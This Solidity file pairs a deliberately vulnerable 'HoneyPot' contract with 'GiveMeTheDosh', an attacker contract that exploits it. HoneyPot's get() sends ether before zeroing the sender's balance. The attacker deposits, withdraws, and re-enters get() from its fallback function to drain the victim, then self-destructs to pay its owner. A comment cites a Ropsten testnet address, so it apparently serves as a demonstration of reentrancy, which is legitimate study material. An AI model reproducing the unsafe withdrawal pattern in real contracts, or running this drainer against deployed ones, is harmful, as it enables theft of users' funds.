pragma solidity ^0.4.8;

contract HoneyPot {
    mapping (address => uint) public balances;

    function HoneyPot() payable {
        put();
    }

    function put() payable {
        balances[msg.sender] = msg.value;
    }

    function get() {
        if (!msg.sender.call.value(balances[msg.sender])()) {
            throw;
        }
        balances[msg.sender] = 0;
    }

    function() {
        throw;
    }
}

contract GiveMeTheDosh {

    //owner address to set on constructor and allow kill to fund back to
    address owner;

    //host contact holding the honey
    address honeyPot;


    function GiveMeTheDosh(address honeyLiveHere) {
        owner = msg.sender;

        //ropsten address is 0x4bf020346b2f3ca286656ef59ead70ab55d9fb18;
        honeyPot = honeyLiveHere;

    }


    function kill() {
        //if originator then destruct and fund
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }


    function attackHP() payable {
        HoneyPot(honeyPot).put.value(msg.value)();
        HoneyPot(honeyPot).get();
        //honeyPot.call.value(msg.value)(bytes4(sha3('put()')));
        //honeyPot.call(bytes4(sha3('get()')));
    }

    function() payable {
        if (msg.sender.balance >= 0) {
            //honeyPot.call(bytes4(sha3('get()')));
            HoneyPot(honeyPot).get();
        }
    }

}
